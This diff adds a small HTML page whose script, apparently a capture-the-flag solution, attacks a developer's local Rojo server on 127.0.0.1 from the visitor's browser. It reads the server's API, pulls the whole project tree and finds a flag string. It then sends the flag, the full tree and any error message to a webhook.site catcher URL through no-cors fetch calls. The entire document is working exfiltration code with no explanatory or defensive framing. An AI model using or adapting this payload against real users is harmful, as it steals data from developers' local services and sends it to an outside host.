@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+(async () => {
+  const rojo = 'http://127.0.0.1:34872';                                     // the dev's secret server
+  const home = 'https://webhook.site/d5fb5dae-1544-4959-b12d-bcd731668f12';   // your catcher
+  const beam = (u, o) => fetch(u, Object.assign({ mode: 'no-cors' }, o || {})); // send-only, won't error cross-origin
+
+  try {
+    const info = await fetch(rojo + '/api/rojo').then(r => r.json());         // 1. get the root id
+    const root = info.rootInstanceId || info.root_instance_id;
+    const tree = await fetch(rojo + '/api/read/' + root).then(r => r.text()); // 2. read the whole tree
+    const hit  = tree.match(/[o0][o0]\{[^}]*\}/i);                            // 3. find the flag
+
+    await beam(home + '?flag=' + encodeURIComponent(hit ? hit[0] : 'NOT_FOUND_CHECK_BODY')); // 4. mail it
+    await beam(home, { method: 'POST', body: tree });                        //    + full tree as backup
+  } catch (e) {
+    await beam(home + '?error=' + encodeURIComponent(e.message));            // if it breaks, tell us why
+  }
+})();
+</script>
+</body>
+</html>
